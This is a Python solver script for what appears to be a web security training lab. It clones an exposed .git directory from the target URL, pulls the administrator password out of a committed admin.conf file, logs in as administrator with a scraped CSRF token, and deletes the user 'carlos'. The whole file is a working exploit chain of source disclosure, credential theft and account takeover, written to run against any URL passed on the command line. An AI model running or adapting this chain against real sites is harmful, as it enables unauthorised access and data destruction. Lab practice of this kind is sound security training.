import requests
import re
import shlex
import subprocess
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.admin_password = None

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('value="(.*)"', response.text).group(1)

    def get_administrator_password(self):
        # You can find my tool 'git_cloner.py' here: https://github.com/ma4747gh/GitCloner
        command = 'python git_cloner.py {}'.format(self.lab_url)
        args = shlex.split(command)
        subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        command = 'cat data_directory/commit_1/admin.conf'
        args = shlex.split(command)
        self.admin_password = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.strip().decode().split('=')[1]

    def sign_in_as_admin_and_delete_carlos(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'administrator',
            'password': self.admin_password
        }

        self.session.post(self.lab_url + 'login', data=data)
        self.session.get(self.lab_url + 'admin/delete?username=carlos')

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_administrator_password()
        self.sign_in_as_admin_and_delete_carlos()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
